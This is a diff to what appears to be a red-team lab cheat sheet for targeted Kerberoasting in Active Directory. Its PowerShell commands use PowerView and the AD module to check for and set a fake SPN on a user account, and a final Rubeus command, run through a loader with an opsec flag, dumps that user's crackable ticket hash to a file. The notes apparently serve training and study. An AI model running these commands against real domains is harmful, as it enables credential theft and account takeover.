@@ -14,20 +14,20 @@ Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match "RDP
 
 Check if the user has an SPN set (PowerView + AD Module)
 ```powershell
-Get-DomainUser -Identity supportuser | select serviceprincipalname
+Get-DomainUser -Identity Support548User | select serviceprincipalname
 
-Get-ADUser -Identity supportuser -Properties ServicePrincipalName | select ServicePrincipalName
+Get-ADUser -Identity Support548User -Properties ServicePrincipalName | select ServicePrincipalName
 ```
 
 Set SPN for the user - **must be unique for the forest** (PowerView + AD Module)
 ```powershell
-Set-DomainObject -Identity support1user -Set @{serviceprincipalname=‘dcorp/totallylegitSPN'}
+Set-DomainObject -Identity Support548User -Set @{serviceprincipalname='dcorp/totallylegitSPN'} -verbose
 
-Set-ADUser -Identity support1user -ServicePrincipalNames
-@{Add=‘dcorp/whatever1'}
+Set-ADUser -Identity Support548User -ServicePrincipalNames
+@{Add='dcorp/whatever1'}
 ```
 
 Kerberoast
 ```powershell
-.\Loader.exe -path .\Rubeus.exe -args kerberoast /user:support1user /simple /rc4opsec /outfile:support1user.hash
+.\Loader.exe -path .\Rubeus.exe -args kerberoast /user:Support548User /simple /rc4opsec /outfile:Support548User.hash
 ```
